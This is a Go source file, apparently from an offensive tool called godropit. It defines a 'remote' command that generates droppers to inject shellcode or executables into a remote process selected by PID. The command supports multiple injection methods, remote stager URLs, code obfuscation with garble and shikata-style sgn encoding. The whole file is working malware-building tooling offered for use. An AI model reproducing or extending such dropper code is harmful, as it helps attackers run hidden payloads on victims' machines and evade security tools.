package cmd

import (
	"log"
	"strings"
	"time"

	"github.com/kopp0ut/godropit/internal/godroplib/remote"
	"github.com/kopp0ut/godropit/pkg/gengo"

	"github.com/spf13/cobra"
)

var pid string

// remoteCmd represents the remote command
var remoteCmd = &cobra.Command{
	Use:   "remote",
	Short: "Execute in the remote process",
	Long:  `Executes in the remote process. Executes shellcode in the specified pid. `,
	Run: func(cmd *cobra.Command, args []string) {
		checkImg()
		if input == "" {
			log.Fatalln("Please pass shellcode with -i <shellcodefile.bin|PE.exe>")
		}

		if prestamp {
			name = time.Now().UTC().Format("010206_1504") + "_" + name
		}

		var remoteDrop gengo.Dropper
		var Dtype gengo.DtypeRemote
		var err error
		gengo.Garble = garble

		Dtype.Args = procArgs
		Dtype.Pid = pid
		remoteDrop.Delay = timer
		remoteDrop.Arch = arch
		remoteDrop.Shared = shared
		remoteDrop.Debug = debug

		remoteDrop.Dtype, err = gengo.GenDTypeRemote(Dtype)
		if err != nil {
			log.Fatalln(err)
		}

		shellcode := gengo.NewShellcode(&remoteDrop, input, output, name, sgn)

		if stagerurl != "" {
			gengo.NewStager(&remoteDrop, shellcode, stagerurl, imgpath, hostname, ua, name, output)

		}

		if len(methods) >= 1 {
			for i := range methods {
				remoteDrop.Debug = true
				method := methods[i]
				remoteDrop.Dlls, remoteDrop.Inject, remoteDrop.Import, remoteDrop.Extra = remote.SelectRemote(strings.ToLower(method))
				methodname := name + "_" + method
				gengo.NewDropper(remoteDrop, methodname, domain, input, output)
			}
		} else {
			remoteDrop.Dlls, remoteDrop.Inject, remoteDrop.Import, remoteDrop.Extra = remote.SelectRemote("")

			gengo.NewDropper(remoteDrop, name, domain, input, output)
		}
	},
}

func init() {
	newCmd.AddCommand(remoteCmd)

	remoteCmd.MarkFlagRequired("in")
	remoteCmd.MarkFlagRequired("name")
	remoteCmd.MarkFlagRequired("out")

	// remote specific flags
	remoteCmd.Flags().StringVar(&pid, "pid", "0", "Set remote process pid, default is 0")
}
